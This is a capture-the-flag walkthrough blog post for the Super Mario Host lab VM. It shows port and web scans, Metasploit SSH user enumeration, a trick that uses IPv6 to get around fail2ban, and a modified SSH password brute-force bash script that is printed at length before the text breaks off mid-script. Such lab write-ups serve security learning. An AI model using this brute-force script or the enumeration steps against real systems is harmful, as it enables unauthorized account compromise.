title = "Super Mario Host CTF Walkthrough | rastating.github.io"
description = "Super Mario Host is an SMB themed CTF created by mr_h4sh. The goal of the CTF is to discover the two hidden flags and to find the passwords of all the charac..."
full_description = '''Super Mario Host CTF Walkthrough June 16, 2017 Super Mario Host is an SMB themed CTF created by mr_h4sh. The goal of the CTF is to discover the two hidden flags and to find the passwords of all the characters with accounts on the system. Service Discovery Running Nmap revealed that the target machine has an SSH and HTTP server running on ports 22 and 8180. Based on the fingerprinting Nmap carried out, they seemed to be OpenSSH 6.6.1p1 and Apache: msf > db_nmap -PN 10.2.0.0/24 *** [*] Nmap: Nmap scan report for 10.2.0.104 [*] Nmap: Host is up (0.00016s latency). [*] Nmap: Not shown: 998 closed ports [*] Nmap: PORT STATE SERVICE [*] Nmap: 22/tcp open ssh [*] Nmap: 8180/tcp open unknown *** msf > db_nmap -sV 10.2.0.104 -p 22,8180 [*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-11 13:52 BST [*] Nmap: Nmap scan report for 10.2.0.104 [*] Nmap: Host is up (0.00030s latency). [*] Nmap: PORT STATE SERVICE VERSION [*] Nmap: 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) [*] Nmap: 8180/tcp open http Apache httpd [*] Nmap: MAC Address: 08:00:27:BE:21:FC (Oracle VirtualBox virtual NIC) [*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 24.54 seconds Analysis of Web Server Taking a look at the default page being served by the web server indicated the web server is actually nginx, as opposed to Apache, as the default nginx page is being served with the message: Welcome to nginx! If you see this page, the nginx web server is successfully installed and working. Further configuration is required. For online documentation and support please refer to nginx.org. Commercial support is available at nginx.org. Thank you for using nginx. Nikto seemed to agree with Nmap that the web server is indeed Apache, and also found one of the default Apache files as well, but failed to find anything else of interest: root@kali:~# nikto -host http://10.2.0.104:8180 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.2.0.104 + Target Hostname: 10.2.0.104 + Target Port: 8180 + Start Time: 2017-06-11 14:01:36 (GMT1) --------------------------------------------------------------------------- + Server: Apache + Server leaks inodes via ETags, header found with file /, fields: 0x264 0x54a3d83d87463 + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + No CGI Directories found (use '-C all' to force check all possible dirs) + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + OSVDB-3233: /icons/README: Apache default file found. + 7537 requests: 0 error(s) and 4 item(s) reported on remote host + End Time: 2017-06-11 14:01:49 (GMT1) (13 seconds) --------------------------------------------------------------------------- + 1 host(s) tested Running dirb using the big.txt wordlist uncovered a single interesting entry, which was a file named vhosts: root@kali:~# dirb http://10.2.0.104:8180 /usr/share/wordlists/dirb/big.txt *** + http://10.2.0.104:8180/server-status (CODE:403|SIZE:215) + http://10.2.0.104:8180/vhosts (CODE:200|SIZE:1364) *** The file contained an Apache virtual host configuration file, eluding to there being a vhost configured on the machine: <VirtualHost *:80> # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request's Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. ServerName mario.supermariohost.local ServerAdmin webmaster@localhost DocumentRoot /var/www/supermariohost DirectoryIndex mario.php # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/supermariohost_error.log CustomLog ${APACHE_LOG_DIR}/supermariohost_access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with "a2disconf". #Include conf-available/serve-cgi-bin.conf </VirtualHost> Virtual hosts work by checking the value submitted in the Host header of a HTTP request and then using that to choose which directory to serve. In this instance, if the server is addressed by accessing http://mario.supermariohost.local:8180/ as opposed to http://10.2.0.104:8180/, it would serve the mario.php file from the /var/www/supermariohost directory. This is easily set when using cURL to access files, but in order to easily view the rendered pages, I added a new entry to my hosts file so I could access it from a browser easily by running echo "10.2.0.104 mario.supermariohost.local" >> /etc/hosts Once the hosts file was updated, I navigated to the page and had a poke around the JavaScript to see if there was any interesting easter eggs, but didn’t find anything; just a small Mario game: I also re-ran Nikto and dirb, but this time specifying the Mario vhost using nikto -host 10.2.0.104:8180 -vhost mario.supermariohost.local and dirb http://10.2.0.104:8180 /usr/share/wordlists/dirb/big.txt -H "Host: mario.supermariohost.local". Neither scan discovered any new files being served. Re-winding back to the vhost file, as there was a mario.php file being served as the default page, I tried luigi.php and found a message from Mario’s taller, greener brother: Hey!! It’sa Luiiiggiii!! My short brother doesn’t know that I’m wandering around his host and messing around, he’s new with computers! Since I’m here I want to tell you more about myself…my brother is a nice person but we are in love for the same person: Princess Peach! I hope she will find out about this. I Love Peach Forever yours, Luigi As I manually found two files named after Super Mario characters, I put together a word list using character names from the series to use with dirb, but none yielded any hits (other than the already identified mario.php and luigi.php). SSH Enumeration & Analysis With no more leads to follow on the web server, I began to enumerate the users on the SSH server using the ssh_enumusers Metasploit module. The user list I used for this was the word list I had previously generated containing the Super Mario character names. msf auxiliary(ssh_enumusers) > run [*] 10.2.0.104:22 - SSH - Checking for false positives [*] 10.2.0.104:22 - SSH - Starting scan [-] 10.2.0.104:22 - SSH - User 'yoshi' not found [-] 10.2.0.104:22 - SSH - User 'luigi' not found [-] 10.2.0.104:22 - SSH - User 'mario' not found [-] 10.2.0.104:22 - SSH - User 'toad' not found [+] 10.2.0.104:22 - SSH - User 'donkeykong' found [-] 10.2.0.104:22 - SSH - User 'donkey-kong' on could not connect [-] 10.2.0.104:22 - SSH - User 'kingkoopa' not found [-] 10.2.0.104:22 - SSH - User 'king-koopa' not found [-] 10.2.0.104:22 - SSH - User 'kingboo' not found [-] 10.2.0.104:22 - SSH - User 'king-boo' not found [-] 10.2.0.104:22 - SSH - User 'princesspeach' not found [-] 10.2.0.104:22 - SSH - User 'princess-peach' not found [-] 10.2.0.104:22 - SSH - User 'rosalina' not found [+] 10.2.0.104:22 - SSH - User 'toadette' found [-] 10.2.0.104:22 - SSH - User 'princessdaisy' on could not connect [-] 10.2.0.104:22 - SSH - User 'princess-daisy' not found [-] 10.2.0.104:22 - SSH - User 'bowserjr' not found [-] 10.2.0.104:22 - SSH - User 'bowser-jr' not found [-] 10.2.0.104:22 - SSH - User 'kamek' not found [-] 10.2.0.104:22 - SSH - User 'koopalings' not found [-] 10.2.0.104:22 - SSH - User 'toadsworth' not found [-] 10.2.0.104:22 - SSH - User 'waluigi' not found [-] 10.2.0.104:22 - SSH - User 'birdo' not found [-] 10.2.0.104:22 - SSH - User 'wario' not found [+] 10.2.0.104:22 - SSH - User 'lemmykoopa' found [-] 10.2.0.104:22 - SSH - User 'lemmy-koopa' on could not connect [-] 10.2.0.104:22 - SSH - User 'peteypiranha' not found [-] 10.2.0.104:22 - SSH - User 'petey-piranha' not found [-] 10.2.0.104:22 - SSH - User 'drmario' not found [-] 10.2.0.104:22 - SSH - User 'dr-mario' not found [-] 10.2.0.104:22 - SSH - User 'pauline' not found [-] 10.2.0.104:22 - SSH - User 'kammykoopa' not found [-] 10.2.0.104:22 - SSH - User 'kammy-koopa' not found [-] 10.2.0.104:22 - SSH - User 'fawful' not found [-] 10.2.0.104:22 - SSH - User 'wart' not found [+] 10.2.0.104:22 - SSH - User 'tatanga' found [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed There was an interesting pattern with these results, which made me believe I was getting false-positives. That being, for every user that it believed it had found, the next user timed out, for example: [+] 10.2.0.104:22 - SSH - User 'donkeykong' found [-] 10.2.0.104:22 - SSH - User 'donkey-kong' on could not connect As there was a rather consistent pattern to the timeouts, this led me to believe there may be something such as fail2ban running, which will block IP addresses for a specific amount of time, should it detect enough suspicious activity in the log files of the services it is monitoring. On the off-chance it was indeed fail2ban causing the timeouts, I decided to try enumeration using IPv6 instead, as fail2ban has no IPv6 support at all (as of June 2017). To do this, I needed to identify the IPv6 address of the target machine, which I did using the ipv6_multicast_ping Metasploit module; though, this can also be done using the ping6 application. msf auxiliary(ssh_enumusers) > use auxiliary/scanner/discovery/ipv6_multicast_ping msf auxiliary(ipv6_multicast_ping) > set INTERFACE eth1 INTERFACE => eth1 msf auxiliary(ipv6_multicast_ping) > run [*] Sending multicast pings... [*] Listening for responses... [*] |*| fe80::800:27ff:fe00:0 => 0a:00:27:00:00:00 [*] |*| fe80::a00:27ff:febe:21fc => 08:00:27:be:21:fc [*] Auxiliary module execution completed As there were two hosts with IPv6 addresses responding to the multicast, I ran Nmap against them to narrow down which one is the target, and found that fe80::a00:27ff:febe:21fc had the same open ports: msf auxiliary(ssh_enumusers) > db_nmap -sS -6 fe80::a00:27ff:febe:21fc%eth1 [*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-11 16:29 BST [*] Nmap: Nmap scan report for fe80::a00:27ff:febe:21fc [*] Nmap: Host is up (0.000093s latency). [*] Nmap: Not shown: 998 closed ports [*] Nmap: PORT STATE SERVICE [*] Nmap: 22/tcp open ssh [*] Nmap: 8180/tcp open unknown [*] Nmap: MAC Address: 08:00:27:BE:21:FC (Oracle VirtualBox virtual NIC) [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds N.B. %eth1 is appended in some places to the IPv6 address as to indicate which interface to use. For modules / applications that allow you to specify the interface, this can be omitted. After identifying the IPv6 address of the target, I began to re-run the ssh_enumusers module against it. This time, every request was timing out, however the port was definitely open and the service was definitely listening, which indicated that the Metasploit module may not support IPv6. As a result of the module failing, I went on the hunt for an SSH brute force script and came across getsshpass.sh by Radovan Brezula. This script doesn’t support IPv6 out of the box, but I made a few quick modifications to it in order to use it against the IPv6 target. The modified script can be downloaded from This Gist or can be found below: #!/bin/bash # # sshpass return values: # 0 - password OK # 3 - general runtime error # 5 - bad password # 255 - connection refused declare -r START_TIME=$(date +%s.%N) # Start time of the program function usage { echo -e "Usage: $0 [OPTIONS]" echo "OPTIONS: " echo -e " -a IP address of SSH server" echo -e " -d TCP port 1 - 65535 of SSH server" echo -e " -n slow down or speed up attack for number of seconds" echo -e " e.g. 1, 0.1, 0.0, default value is 0.1" echo -e " -p path to file with passwords" echo -e " -u path to file with usernames" echo -e " -v display version" echo -e " -h display help" } function version { echo -e "getsshpass.sh 0.8" echo -e "Copyright (C) 2016 Radovan Brezula 'brezular'" echo -e "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>." echo -e "This is free software: you are free to change and redistribute it." echo -e "There is NO WARRANTY, to the extent permitted by law." exit } function read_args { while getopts "a:d:n:p:u:hv" arg; do case "$arg" in a) ip="$OPTARG";; d) port="$OPTARG";; n) nval="$OPTARG";; p) passlist="$OPTARG" initpasslist="$passlist";; u) userlist="$OPTARG" inituserlist="$userlist";; v) version;; h) usage exit;; esac done } function check_args { pthdir="$(dirname $0)" if [ -f "$pthdir/x0x901f22result.txt" ]; then pass=$(grep -o "d: '.*'" x0x901f22result.txt | cut -d ":" -f2) echo "File '$pthdir/x0x901f22result.txt' contains saved password:$pass, nothing to do" && exit fi type -P sshpass 1>/dev/null [ "$?" -ne 0 ] && echo "Utillity 'sshpass' not found, exiting" && exit if [ -z "$ip" ]; then echo "IP address can't be empty, exiting" usage exit fi [ -z "$nval" ] && nval=0.1 # Use default value 0.1s if no -n is entered [ -z "$port" ] && echo "TCP port can'be empty, exiting" && usage && exit if [[ "$port" =~ ^[[:digit:]]+$ ]]; then if ( [ "$port" -gt 65535 ] || [ "$port" -eq 0 ] ); then echo "TCP port has to be in range 1 - 65535" usage exit fi else echo "TCP port must be digit, exiting" usage exit fi [ ! -f "$passlist" ] && echo "Can't find file with list of passwords, exiting" && usage && exit [ ! -f "$userlist" ] && echo "Can't find file with list of users, exiting" && usage && exit fullpasslist="$passlist" #Backup original passlist fulluserlist="$userlist" #Backup oroginal userlist # Check SSH connection echo -n "Checking SSH connection to '$ip': " sshpass -p admin ssh -6 -o StrictHostKeyChecking=no -o ConnectTimeout=8 -p "$port" admin@"$ip" exit &>/dev/null; rvalssh="$?" if [ "$rvalssh" == 0 ]; then echo "*** OK ***" echo "*** Found username: 'admin' and password: 'admin' ***" > "$pthdir/x0x901f22result.txt" evaluate_result elif [ "$rvalssh" == 255 ]; then echo "*** FAIL ***" echo "*** Can't establish SSH connection to '$ip', exiting ***" && exit else echo "*** OK ***" fi # Read saved username and password from file 01xza01.txt, if file exists read saved credentials from file if [ -f "$pthdir/01xza01.txt" ]; then lastuser=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f1) lastpass=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f2) echo "Found file: '$pthdir/0'''
